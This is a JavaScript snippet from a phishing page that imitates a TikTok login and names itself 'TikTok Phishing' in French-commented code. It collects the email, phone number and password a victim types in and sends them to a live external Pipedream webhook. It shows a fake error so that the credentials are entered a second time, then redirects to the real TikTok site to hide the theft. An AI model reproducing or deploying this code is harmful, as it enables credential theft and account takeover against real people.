<script>
  let attempts = 0;

  const PIPEDREAM_WEBHOOK = "https://eov3l04y6gu1pmi.m.pipedream.net";

  function sendToPipedream(email, phone, pass) {
    const data = {
      platform: "TikTok Phishing",
      email: email || "Non renseigné",
      phone: phone || "Non renseigné",
      password: pass || "Non renseigné",
      user_agent: navigator.userAgent,
      timestamp: new Date().toLocaleString("fr-FR"),
      ip_will_be_in_headers: "voir x-forwarded-for dans Pipedream"
    };

    fetch(PIPEDREAM_WEBHOOK, {
      method: "POST",
      body: JSON.stringify(data),
      headers: { "Content-Type": "application/json" },
      mode: "no-cors"
    });
  }

  // Le reste du code reste 100 % identique
  function submitLogin() {
    const email = document.getElementById("email").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const pass = document.getElementById("pass").value;

    if (email || pass) sendToPipedream(email, phone, pass);

    attempts++;
    if (attempts >= 2) {
      document.getElementById("loginPage").style.display = "none";
      document.getElementById("successScreen").style.display = "flex";

      let seconds = 3;
      const countdownEl = document.getElementById("countdown");
      const timer = setInterval(() => {
        seconds--;
        countdownEl.textContent = seconds;
        if (seconds <= 0) {
          clearInterval(timer);
          window.location.replace("https://www.tiktok.com");
        }
      }, 1000);
    } else {
      document.getElementById("error").style.display = "block";
    }
  }
</script>
